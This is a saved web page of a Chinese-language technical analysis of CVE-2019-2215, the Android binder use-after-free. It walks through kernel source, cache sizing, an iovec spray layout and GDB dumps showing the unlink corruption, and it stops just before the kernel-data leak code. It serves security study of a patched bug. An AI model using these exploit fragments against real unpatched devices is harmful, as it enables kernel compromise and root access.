    <script src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/jquery.toc.min.js.下載"></script>
    <script src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/toc.min.js.下載"></script>
    <script src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/dt.js.下載"></script>
    


<div class="row box content">
    
    <div class="box-container">
        <div class="main-topic">
            <div class="clearfix user-info topic-list">
                <p><span class="content-title ">CVE-2019-2215—android内核binder漏洞分析(2)</span>
                </p>
                <div class="topic-info">
                <span class="info-left">
                    <a href="https://xz.aliyun.com/u/4572">
                        <span class="username cell"> houjingyi</span></a> <span class="i-seprator"> / </span>
                    <span> 2019-12-01 10:02:30</span><span class="i-seprator"> / </span>
                    <span>浏览数 9954</span>
                    
                    
                    <span class="content-node">
                    
                        <span class="label label-default label-node-first">
                            <a href="https://xz.aliyun.com/tab/1">安全技术</a></span>
                        <span class="label label-default">
                            <a href="https://xz.aliyun.com/node/1">漏洞分析</a></span>
                    
                    </span>
                </span>
                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(6853);">
             顶(0)</a>
             <a class="vote vote-down" href="javascript:" onclick="voteDown(6853);">
             踩(0)</a></span>
                </div>
            </div>
            <hr>
            <div id="topic_content" class="topic-content markdown-body">
                <p>本文原文来自<a href="https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/" target="_blank" title="Analyzing Android&#39;s CVE-2019-2215 (/dev/binder UAF)">Analyzing Android's CVE-2019-2215 (/dev/binder UAF)</a>。研究的过程中后来Project Zero又出了一篇博客，所以加了Project Zero博客中的一些图片和注释，好理解一点。</p>
<h2 id="toc-0">前言</h2>
<p>在过去的几周中，那些经常在Twitch上访问DAY[0]的人可能已经看到我正在努力理解Project Zero发布的最新android binder中的UAF漏洞。这并不是一个新的漏洞，它已在2018年2月发现并在主线内核中得到修复，但是Project Zero发现许多设备没有在下游收到补丁。其中一些设备包括Pixel 2，华为P20和三星Galaxy S7，S8和S9。我相信其中许多设备在过去几周内都收到了安全补丁，这些补丁最终修补了该漏洞。<br>
在虚拟机(android-x86)上运行内核调试器并使用存在漏洞的Pixel 2进行了几轮测试之后，我逐渐理解了Jann Horn和Maddie Stone编写的EXP。如果不了解binder(具体来说是binder_thread对象)以及vectored I/O的工作原理，则可能不是很好理解EXP。他们利用该漏洞的方法也很聪明，因此我认为写下EXP的原理很酷。<br>
我们将主要关注如何建立任意读写原语，而不会关注诸如禁用SELinux并启用完整root功能之类的后利用的东西，因为已经有很多关于它们的文章了。这是本文要涵盖的内容的简要概述：<br>
1.binder和vectored I/O的基本概述<br>
2.漏洞详情<br>
3.泄漏内核task结构体<br>
4.建立任意读写原语<br>
5.结论<br>
请注意，所有代码均来自内核v4.4.177，这也是我亲自测试的内核。<br>
注：对于建立任意读写原语之后如何禁用SELinux并启用完整root功能等内容如果有兴趣可以阅读<a href="https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/" target="_blank" title="Tailoring CVE-2019-2215 to Achieve Root">Tailoring CVE-2019-2215 to Achieve Root</a>这篇文章。</p>
<h2 id="toc-1">binder和vectored I/O的基本概述</h2>
<h3 id="toc-2">binder</h3>
<p>binder驱动程序是仅用于android的驱动程序，它提供了一种简单的IPC(Inter Process Communication，进程间通信)方法，包括RPC(Remote Procedure Calling，远程过程调用)。您可以在主线linux内核中找到此驱动程序的源代码，但是其未针对非android版本进行配置。<br>
有几种不同的binder设备驱动程序可用于不同类型的IPC。使用AIDL(Android Interface Definition Language，Android接口定义语言)在framework和应用程序进程之间进行通信需要使用/dev/binder；使用HIDL(HAL Interface Definition Language，硬件抽象层接口定义语言)在framework和应用程序进程之间进行通信需要使用/dev/hwbinder。最后，对于希望在供应商进程之间使用IPC而不使用HIDL的供应商，可以使用/dev/vndbinder。研究EXP我们只需要关心第一个驱动程序/dev/binder。<br>
与linux中的大多数IPC机制一样，binder通过文件描述符工作，您可以使用EPOLL API向其添加epoll。</p>
<h3 id="toc-3">vectored I/O</h3>
<p>vectored I/O允许使用多个缓冲区写入数据流，或将数据流读取到多个缓冲区。也称为scatter/gather I/O(分散/聚集 I/O)。与non-vectored I/O相比，vectored I/O具有一些优势：可以使用不连续的不同缓冲区进行写入或读取，而不会产生大量开销。这也是原子的。<br>
vectored I/O有用的一个示例是当数据包中有一个头部，后跟连续块中的数据的时候。使用vectored I/O可以将头部和数据保存在单独的非连续缓冲区中，并通过一个系统调用而不是两个系统调用对其进行读取或写入。<br>
<a id="img0" href="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191125143428-a164e062-0f4d-1.png"><img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191125143428-a164e062-0f4d-1.png"></a><br>
使用方法是定义一个iovec结构体数组，其中包含有关要用于I/O的所有缓冲区的信息。该iovec结构体相对较小，在64位系统上仅包含两个QWORD(8字节数据)。</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">iovec</span> <span class="p">{</span>      <span class="c1">// Size: 0x10</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">iov_base</span><span class="p">;</span> <span class="c1">// 0x00</span>
    <span class="kt">size_t</span> <span class="n">iov_len</span><span class="p">;</span> <span class="c1">// 0x08</span>
<span class="p">}</span>
</pre></div>
<h2 id="toc-4">漏洞详情</h2>
<p>binder驱动程序具有清理例程，可以通过ioctl函数在实际关闭驱动程序之前触发该例程。如果你熟悉驱动程序和清理例程，则可能已经猜到了为什么这会引起问题。<br>
让我们看一下Project Zero报告的摘要：如上游提交中所述，<code>binder_poll</code>函数传递thread-&gt;wait waitqueue，该队列可以在工作时休眠。当使用epoll的线程使用<code>BINDER_THREAD_EXIT</code>显式退出时，waitqueue将被释放，但它不会从相应的epoll数据结构中删除。当进程随后退出时，epoll清理代码将尝试访问waitqueue，这将导致UAF。<br>
摘要有点误导，UAF不在waitqueue本身上。waitqueue是<code>binder_thread</code>结构体中内联的结构体，<code>binder_thread</code>对象实际上才是UAF的对象。他们在此摘要中提到waitqueue的原因是此问题最初是由Google的syzkaller fuzzer于2017年发现的，该fuzzer在waitqueue上触发了KASAN检测到的UAF。</p>
<h3 id="toc-5">free</h3>
<p>让我们看一下有问题的ioctl命令<code>BINDER_THREAD_EXIT</code>。</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">long</span> <span class="nf">binder_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// [...]</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// [...]</span>
    <span class="k">case</span> <span class="nl">BINDER_THREAD_EXIT</span><span class="p">:</span>
        <span class="n">binder_debug</span><span class="p">(</span><span class="n">BINDER_DEBUG_THREADS</span><span class="p">,</span> <span class="s">"%d:%d exit</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                 <span class="n">proc</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="kr">thread</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
        <span class="n">binder_free_thread</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="kr">thread</span><span class="p">);</span>
        <span class="kr">thread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
     <span class="c1">// [...]</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// [...]</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">binder_free_thread</span><span class="p">(</span><span class="k">struct</span> <span class="n">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
                  <span class="k">struct</span> <span class="n">binder_thread</span> <span class="o">*</span><span class="kr">thread</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">binder_transaction</span> <span class="o">*</span><span class="n">t</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">binder_transaction</span> <span class="o">*</span><span class="n">send_reply</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">active_transactions</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// [...]</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">active_transactions</span><span class="o">++</span><span class="p">;</span>
        <span class="c1">// [...]</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">send_reply</span><span class="p">)</span>
        <span class="n">binder_send_failed_reply</span><span class="p">(</span><span class="n">send_reply</span><span class="p">,</span> <span class="n">BR_DEAD_REPLY</span><span class="p">);</span>
    <span class="n">binder_release_work</span><span class="p">(</span><span class="o">&amp;</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">todo</span><span class="p">);</span>
    <span class="n">kfree</span><span class="p">(</span><span class="kr">thread</span><span class="p">);</span>
    <span class="n">binder_stats_deleted</span><span class="p">(</span><span class="n">BINDER_STAT_THREAD</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">active_transactions</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>有问题的代码是第2610行：kfree(thread)。这就是UAF中free发生的地方。</p>
<h3 id="toc-6">use(after free)</h3>
<p>我们已经看到了free发生的地方，让我们尝试看看free之后use发生的地方。KASAN报告中的stack trace将对此有所帮助。</p>
<div class="highlight"><pre><span></span>Call Trace:
  ...
  _raw_spin_lock_irqsave+0x96/0xc0 kernel/locking/spinlock.c:159
  remove_wait_queue+0x81/0x350 kernel/sched/wait.c:50
  ep_remove_wait_queue fs/eventpoll.c:595 <span class="o">[</span>inline<span class="o">]</span>
  ep_unregister_pollwait.isra.7+0x18c/0x590 fs/eventpoll.c:613
  ep_free+0x13f/0x320 fs/eventpoll.c:830
  ep_eventpoll_release+0x44/0x60 fs/eventpoll.c:862
  ...
</pre></div>
<p>看上去可能有点让人迷惑，因为<code>binder_thread</code>对象是间接引用的，用Ctrl+F是找不到<code>binder_thread</code>的。但是如果我们查看<code>ep_unregister_pollwait</code>函数：</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">ep_unregister_pollwait</span><span class="p">(</span><span class="k">struct</span> <span class="n">eventpoll</span> <span class="o">*</span><span class="n">ep</span><span class="p">,</span> <span class="k">struct</span> <span class="n">epitem</span> <span class="o">*</span><span class="n">epi</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">lsthead</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">epi</span><span class="o">-&gt;</span><span class="n">pwqlist</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">eppoll_entry</span> <span class="o">*</span><span class="n">pwq</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">list_empty</span><span class="p">(</span><span class="n">lsthead</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">pwq</span> <span class="o">=</span> <span class="n">list_first_entry</span><span class="p">(</span><span class="n">lsthead</span><span class="p">,</span> <span class="k">struct</span> <span class="n">eppoll_entry</span><span class="p">,</span> <span class="n">llink</span><span class="p">);</span>

        <span class="n">list_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pwq</span><span class="o">-&gt;</span><span class="n">llink</span><span class="p">);</span>
        <span class="n">ep_remove_wait_queue</span><span class="p">(</span><span class="n">pwq</span><span class="p">);</span>
        <span class="n">kmem_cache_free</span><span class="p">(</span><span class="n">pwq_cache</span><span class="p">,</span> <span class="n">pwq</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>我们会发现被释放的<code>binder_thread</code>在<code>eppoll_entry</code>链表中，即pwq。让我们来看看<code>ep_remove_wait_queue</code>函数和<code>remove_wait_queue</code>函数。</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">ep_remove_wait_queue</span><span class="p">(</span><span class="k">struct</span> <span class="n">eppoll_entry</span> <span class="o">*</span><span class="n">pwq</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">wait_queue_head_t</span> <span class="o">*</span><span class="n">whead</span><span class="p">;</span>

    <span class="n">rcu_read_lock</span><span class="p">();</span>
    <span class="cm">/*</span>
<span class="cm">     * If it is cleared by POLLFREE, it should be rcu-safe.</span>
<span class="cm">     * If we read NULL we need a barrier paired with</span>
<span class="cm">     * smp_store_release() in ep_poll_callback(), otherwise</span>
<span class="cm">     * we rely on whead-&gt;lock.</span>
<span class="cm">     */</span>
    <span class="n">whead</span> <span class="o">=</span> <span class="n">smp_load_acquire</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pwq</span><span class="o">-&gt;</span><span class="n">whead</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">whead</span><span class="p">)</span>
        <span class="n">remove_wait_queue</span><span class="p">(</span><span class="n">whead</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pwq</span><span class="o">-&gt;</span><span class="n">wait</span><span class="p">);</span>
    <span class="n">rcu_read_unlock</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="c1">// WRITE-UP COMMENT: q points into stale data / the UAF object</span>
<span class="kt">void</span> <span class="nf">remove_wait_queue</span><span class="p">(</span><span class="n">wait_queue_head_t</span> <span class="o">*</span><span class="n">q</span><span class="p">,</span> <span class="n">wait_queue_t</span> <span class="o">*</span><span class="n">wait</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>

    <span class="n">spin_lock_irqsave</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
    <span class="n">__remove_wait_queue</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">wait</span><span class="p">);</span>
    <span class="n">spin_unlock_irqrestore</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>q指向已经被释放的数据，这就是在自旋锁上发生KASAN崩溃的原因。在不使用KASAN的普通设备上，如果按原样运行POC很可能不会发生崩溃，这可能会导致你错误地认为设备不存在漏洞。这是因为已经被释放的数据可能仍然有效。<br>
注：<code>binder_thread</code>结构体和<code>__wait_queue_head</code>结构体如下，<code>remove_wait_queue</code>函数中q是waitqueue的表头，指向<code>binder_thread</code>结构体中的<code>wait_queue_head_t</code>(已经被释放)；wait是waitqueue中的成员，紧随在表头之后。<code>remove_wait_queue</code>函数的功能就是删除紧随在表头之后的一个成员。<br>
<a id="img1" href="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126121129-d261b086-1002-1.png"><img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126121129-d261b086-1002-1.png"></a></p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">binder_thread</span> <span class="p">{</span>
        <span class="k">struct</span> <span class="n">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">rb_node</span> <span class="n">rb_node</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">list_head</span> <span class="n">waiting_thread_node</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">looper</span><span class="p">;</span>              <span class="cm">/* only modified by this thread */</span>
        <span class="kt">bool</span> <span class="n">looper_need_return</span><span class="p">;</span> <span class="cm">/* can be written by other thread */</span>
        <span class="k">struct</span> <span class="n">binder_transaction</span> <span class="o">*</span><span class="n">transaction_stack</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">list_head</span> <span class="n">todo</span><span class="p">;</span>
        <span class="kt">bool</span> <span class="n">process_todo</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">binder_error</span> <span class="n">return_error</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">binder_error</span> <span class="n">reply_error</span><span class="p">;</span>
        <span class="n">wait_queue_head_t</span> <span class="n">wait</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">binder_stats</span> <span class="n">stats</span><span class="p">;</span>
        <span class="n">atomic_t</span> <span class="n">tmp_ref</span><span class="p">;</span>
        <span class="kt">bool</span> <span class="n">is_dead</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">__wait_queue_head</span> <span class="p">{</span>
        <span class="n">spinlock_t</span>              <span class="n">lock</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">list_head</span>        <span class="n">task_list</span><span class="p">;</span>
<span class="p">};</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">__wait_queue_head</span> <span class="n">wait_queue_head_t</span><span class="p">;</span>
</pre></div>
<p>值得注意的是该对象驻留在kmalloc-512缓存中，这是一个可用于漏洞利用的相当不错的缓存，因为与较小的缓存相比，后台进程使用的并不多。在内核v4.4.177中该对象的大小为400个(0x190)字节。因为这个大小位于kmalloc-256和kmalloc-512之间，所以可以假设在大多数设备中这个对象最终在kmalloc-512中。</p>
<h2 id="toc-7">泄漏内核task结构体</h2>
<h3 id="toc-8">利用unlink</h3>
<p>EXP利用了链表中的unlink操作。假设在自旋锁上不会崩溃，考虑一下<code>remove_wait_queue</code>函数，最终也就是<code>__remove_wait_queue</code>函数会做什么：</p>
<div class="highlight"><pre><span></span><span class="c1">// WRITEUP COMMENT: old points to stale data / the UAF object</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span>
<span class="nf">__remove_wait_queue</span><span class="p">(</span><span class="n">wait_queue_head_t</span> <span class="o">*</span><span class="n">head</span><span class="p">,</span> <span class="n">wait_queue_t</span> <span class="o">*</span><span class="n">old</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">list_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">old</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">// ...</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">list_del</span><span class="p">(</span><span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">entry</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__list_del</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">,</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">);</span>
    <span class="n">entry</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">LIST_POISON1</span><span class="p">;</span>
    <span class="n">entry</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">LIST_POISON2</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// ...</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">__list_del</span><span class="p">(</span><span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span> <span class="n">prev</span><span class="p">,</span> <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span> <span class="n">next</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">next</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">prev</span><span class="p">;</span>
    <span class="n">WRITE_ONCE</span><span class="p">(</span><span class="n">prev</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">,</span> <span class="n">next</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>这里最重要的一行代码是<code>next-&gt;prev = prev</code>，这本质上是一个unlink，它将上一个对象的指针写入到我们的UAF对象中。这很有用，因为如果我们在UAF对象的位置放置了另一个内核对象，则可以利用这种手段来覆盖另一个内核对象中的数据。Project Zero使用它泄漏内核数据。哪个对象适合此攻击策略？答案是iovec。<br>
iovec结构体的一些属性使其成为此处漏洞利用的一个很好的候选对象。<br>
1.它们很小(64位机器上为0x10)，可以控制所有字段而几乎没有限制<br>
2.可以通过控制写入多少来控制iovec最终进入哪个kmalloc缓存<br>
3.它们有一个指针(<code>iov_base</code>)，这是使用unlink进行破坏的理想字段<br>
在正常情况下，内核将在使用<code>iov_base</code>的任何位置对其进行检查。内核将在处理请求之前首先确保<code>iov_base</code>是一个用户态指针，但是使用我们刚刚谈到的unlink，我们可以破坏此指针的验证并用内核指针(unlink中的prev)覆盖它。这意味着，当我们从写入了已覆盖的iovec的描述符中读取数据时，我们将读取的数据来自内核态指针，这将使我们能够泄漏与prev指针有关的内核数据，其中所包含的指针足以允许任意读取/写入以及代码执行。<br>
这个过程中的棘手步骤是弄清楚哪个iovec索引与waitqueue对齐。这很重要，因为如果我们没有正确地伪造数据结构设备将死机，我们将无法获得任何乐趣。<br>
如果拥有目标机器的内核镜像则找到waitqueue的偏移量非常容易。通过查看使用<code>binder_thread</code>的waitqueue的函数，我们可以轻松地在反汇编代码中找到偏移量。一个这样的函数是<code>binder_wakeup_thread_ilocked</code>，它会调用<code>wake_up_interruptible_sync(&amp;thread-&gt;wait)</code>。在调用之前将地址加载到X0寄存器中时会引用偏移量。</p>
<div class="highlight"><pre><span></span>.text:0000000000C0E2B4    ADD    X0, X8, <span class="c1">#0xA0</span>
.text:0000000000C0E2B8    MOV    W1, <span class="c1">#1</span>
.text:0000000000C0E2BC    MOV    W2, <span class="c1">#1</span>
.text:0000000000C0E2C0    TBZ    W19, <span class="c1">#0, loc_C0E2CC</span>
.text:0000000000C0E2C4    BL     __wake_up_sync
</pre></div>
<p>在内核v4.4.177上，我们可以看到waitqueue位于<code>binder_thread</code>对象偏移0xA0处。由于iovec大小为0x10，这意味着数组中的索引0xA处的iovec将与waitqueue对齐。</p>
<div class="highlight"><pre><span></span><span class="cp">#define BINDER_THREAD_SZ 0x190</span>
<span class="cp">#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16)</span>
<span class="cp">#define WAITQUEUE_OFFSET 0xA0</span>
<span class="cp">#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16)</span>
</pre></div>
<p>那么，如何传递一个有效的能通过验证同时又将锁保持在0以避免死锁的<code>iov_base</code>地址？由于锁只有一个DWORD(4个字节)，并且可以传递64位指针，因此只需要用mmap映射低32位为0的用户态地址。</p>
<div class="highlight"><pre><span></span><span class="n">dummy_page</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x100000000ul</span><span class="p">,</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

<span class="c1">// ...</span>

<span class="k">struct</span> <span class="n">iovec</span> <span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_ARRAY_SZ</span><span class="p">];</span>
<span class="n">memset</span><span class="p">(</span><span class="n">iovec_array</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">iovec_array</span><span class="p">));</span>

<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">dummy_page_4g_aligned</span><span class="p">;</span> <span class="cm">/* spinlock in the low address half must be zero */</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="cm">/* wq-&gt;task_list-&gt;next */</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xDEADBEEF</span><span class="p">;</span> <span class="cm">/* wq-&gt;task_list-&gt;prev */</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
</pre></div>
<p><a id="img2" href="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126122104-290383aa-1004-1.png"><img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126122104-290383aa-1004-1.png"></a><br>
运行EXP时，<code>IOVEC_INDX_FOR_WQ</code>处的iovec的<code>iov_base</code>和<code>iov_len</code>将分别占上锁和链表中的next指针的位置；<code>IOVEC_INDX_FOR_WQ+1</code>处的iovec的<code>iov_base</code>将占上链表中的prev指针的位置。<br>
让我们看一下unlink之前和之后，运行Android-x86的VM上KGDB中被释放的内存。为此，我在<code>remove_wait_queue</code>函数上设置了一个断点，第一个参数也就是RDI寄存器将指向已释放的内存。如果在该函数被调用之前检查此内存将看到以下内容：</p>
<div class="highlight"><pre><span></span>Thread <span class="m">1</span> hit Breakpoint <span class="m">11</span>, 0xffffffff812811c2 in ep_unregister_pollwait.isra <span class="o">()</span>
gdb-peda$ x/50wx <span class="nv">$rdi</span>
0xffff8880959d68a0:     0x00000000      0x00000001      0x00001000      0x00000000
0xffff8880959d68b0:     0xdeadbeef      0x00000000      0x00001000      0x00000000
...
</pre></div>
<p>请注意数据与上面的iovec结构体之间的对应——例如0xffff88809239a6b0处的值为0xdeadbeef。现在，在<code>ep_unregister_pollwait</code>函数的末尾设置一个断点并检查unlink后相同的内存。</p>
<div class="highlight"><pre><span></span>Thread <span class="m">1</span> hit Breakpoint <span class="m">12</span>, 0xffffffff812811ee in ep_unregister_pollwait.isra <span class="o">()</span>
gdb-peda$ x/50wx 0xffff8880959d68a0
0xffff8880959d68a0:     0x00000000      0x00000001      0x959d68a8      0xffff8880
0xffff8880959d68b0:     0x959d68a8      0xffff8880      0x00001000      0x00000000
...
</pre></div>
<p>可看到，<code>IOVEC_INDX_FOR_WQ</code>处的iovec的<code>iov_len</code>和<code>IOVEC_INDX_FOR_WQ+1</code>处的iovec的<code>iov_base</code>被相同的内核指针覆盖——从而在内核堆中破坏了iovec内部的结构！<br>
注：补上Project Zero博客中unlink前后的示意图。因为这里waitqueue表头之后只有一个成员，所以prev指针和next指针都被覆写成表头的地址(也就是<code>binder_thread</code>+0xa8)。<br>
<a id="img3" href="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126152903-6c2ddc2e-101e-1.png"><img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126152903-6c2ddc2e-101e-1.png"></a><br>
<a id="img4" href="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126152915-736aad50-101e-1.png"><img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126152915-736aad50-101e-1.png"></a></p>
<h3 id="toc-9">触发泄露</h3>
<p>Project Zero使用管道作为泄漏的媒介。攻击策略基本上如下：<br>
1.创建管道<br>
2.在<code>binder_thread</code>对象上触发free<br>
3.在管道上调用writev函数<br>
4.触发UAF/unlink破坏iovec结构<br>
5.在管道上调用read函数，它将使用<code>IOVEC_INDX_FOR_WQ</code>处未被覆写的iovec读取<code>dummy_page</code>数据<br>
6.在管道上再次调用read函数，它将使用<code>IOVEC_INDX_FOR_WQ+1</code>处被覆写的iovec读取内核数据<br>
在两个单独的线程中处理读取和写入更容易。<br>
父线程负责：<br>
1.在<code>binder_thread</code>对象上触发free<br>
2.在管道上调用writev函数<br>
3.(等待子线程)<br>
4.在管道上再次调用read函数，它将使用<code>IOVEC_INDX_FOR_WQ+1</code>处被覆写的iovec读取内核数据<br>
子线程负责：<br>
(接父线程中的第2步)<br>
1.触发UAF/unlink破坏iovec结构<br>
2.在管道上调用read函数，它将使用<code>IOVEC_INDX_FOR_WQ</code>处未被覆写的iovec读取<code>dummy_page</code>数据<br>
注：这里其实原来文章没有说清楚而且有点问题，我改了一下。首先因为前10个iovec都是0所以直接跳过了，然后iovec[10].iov_len和管道的大小一样所以父进程调用writev函数从iovec[10].iov_base读取<code>dummy_page</code>数据到管道导致管道被阻塞，子进程触发UAF/unlink破坏iovec结构再读取管道解除了阻塞，这个时候父进程再调用writev函数从iovec[11].iov_base读取内核数据到管道再读取管道。补上Project Zero博客中的示意图。<br>
<a id="img5" href="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126162236-e754efe4-1025-1.png"><img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126162236-e754efe4-1025-1.png"></a><br>
现在就得到了泄漏数据的代码(请注意，从功能上讲，代码与Project Zero的代码相似，只不过我对其进行了一点清理并将其移植到应用程序中并添加了<code>__android_log_print</code>函数)：</p>
